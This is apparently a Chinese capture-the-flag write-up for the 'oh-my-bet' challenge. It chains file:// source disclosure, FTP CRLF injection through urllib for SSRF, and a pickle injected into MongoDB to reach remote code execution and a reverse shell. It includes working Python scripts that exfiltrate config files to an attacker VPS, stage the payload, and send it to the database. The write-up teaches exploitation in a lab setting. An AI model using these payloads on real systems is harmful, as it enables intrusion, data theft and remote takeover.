# oh-my-bet-ZH

这是一道利用FTP构造SSRF攻击mongo，并向mongo中插入恶意pickle链，造成RCE的题目，预期攻击链为

```
FTP->mongo->pickle->rce
```

首先在注册页面的avatat参数处，可以使用file协议(`avatar=file:///etc/passwd`)泄露出题目源码，根据`app.py`的代码逻辑结构我们可以依次泄露出`config.py`以及`utils.py`等题目相关文件，在`utils.py`中还可以发现`get_avatar`方法使用`urllib.request.urlopen(path)`来获得avatar，urllib本身是支持ftp协议的（最新版的Python版本是不支持ftp协议进行CLRF的，在2017年的某次更新中才更新了对CLRF的防护，本意是为了降低构造难度选择了支持直接对ftp协议可以进行CLRF的Python3.6.0，但其实看很多师傅们没用这个条件也做出来了），结合知道一台FTP服务器，我们可以先尝试攻击FTP服务器获得一些配置信息，可以在自己的服务器上使用如下脚本来接收内网FTP服务器传过来的配置信息

```
import socket

HOST = '0.0.0.0'
PORT = 1890
blocksize = 4096
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        while 1:
            data = conn.recv(blocksize)
            print(data)
            if not data:
                break
    print('end.')
```

并使用如下脚本来生成获得配置文件的ftp协议请求

```
import urllib.request

# Download file
a = '''CWD files
TYPE I
PORT 1,1,1,1,0,1890   <---- 1,1,1,1 is your vps ip
RETR config.json
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)
```



根据分析源码与配置文件我们可以发现，题目一共运行了五个服务容器，主体Web服务器在启动之前会先请求一个IP地址为`172.20.0.2`的FTP服务器来获得启动相关的配置信息，配置信息中包括用于用户登录注册的MySQL服务信息、用于缓存用户头像的redis服务信息、用于存储用户SESSION的mongodb服务信息。并且题目使用的是flask_session来处理SESSION的存储，flask_session会存储一个pickle串到mongo数据库中，并在登录的时候通过反序列化mongo数据库中检索的pickle串来生成SESSION。

所以此时我们的攻击利用链其实已经大致构思好了，通过urllib发送ftp协议，利用主动模式（port）先让FTP服务器从我们的远程服务器下载一个可以向mongo中插入一个可以造成RCE的恶意pickle串的payload，然后再利用FTP(port)将这个payload发往mongo数据库，在成功插入这个包含对应SESSIONID的恶意pickle串以后，带着这个SESSIONID去访问题目链接，就可以把shell弹给自己的服务器了（注意Web服务器上没有bash，只有sh，所以得稍微调整一下弹shell的姿势），执行/readflag即可获得flag。

伪造插入恶意pickle串的payload我选择的是重放wiershark抓的包的办法，可以使用pymongo模拟向自己本地发送插入pickle串的办法，然后使用wireshark分析TCP流，复制raw值赋值出来，利用如下脚本生成payload，

```
import struct

a = '''your raw data'''.replace('\n', '')

c = b''

def results(s):
    a = [int(s[i:i+2], 16) for i in range(0,len(s),2)]
    return a

z = results(a)

with open("bb2.txt", "wb") as f:
    for x in z:
        s = struct.pack('B', x)
        f.write(s)
```

可以使用如下脚本来生成将payload上传至FTP服务器的命令，

```
import urllib.request

# Upload file
a = '''TYPE I
PORT 1,1,1,1,0,1889  <---- 1,1,1,1 is your vps ip
STOR cc2.txt
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)
```

在自己的服务器上布置上一个上传文件的服务，等待内网的FTP服务来获取文件

```
import socket

HOST = '0.0.0.0'  
PORT = 1889        
blocksize = 4096
fp = open('bb2.txt', 'rb')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    print('start listen...')
    s.listen()
    conn, addr = s.accept()
    with conn:
        while 1:
            buf = fp.read(blocksize)
            if not buf:
                fp.close()
                break
            conn.sendall(buf)
    print('end.')
```

最后生成攻击mongo的ftp命令，

```
import urllib.request

# Attack mongodb
a = '''TYPE I
PORT 172,20,0,5,0,27017
RETR cc2.txt
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)
```

成功插入pickle串以后，带着SESSIONID去访问题目页面，即可将shell弹到自己的服务器上，最后执行/readflag即可获得flag。